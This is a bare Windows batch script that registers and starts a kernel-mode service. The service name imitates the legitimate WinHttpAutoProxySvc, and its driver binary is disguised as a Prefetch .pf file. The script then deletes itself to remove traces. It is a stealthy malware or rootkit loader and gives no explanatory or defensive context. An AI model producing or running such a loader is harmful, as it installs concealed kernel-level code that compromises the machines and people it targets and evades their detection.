@echo off
cd %~dp0
sc create WinHttpAutoProxySvc578_c binpath=C:\Windows\Prefetch\CMD.EXE-LWO701D0.pf type=kernel
sc start WinHttpAutoProxySvc578_c
del "%~f0"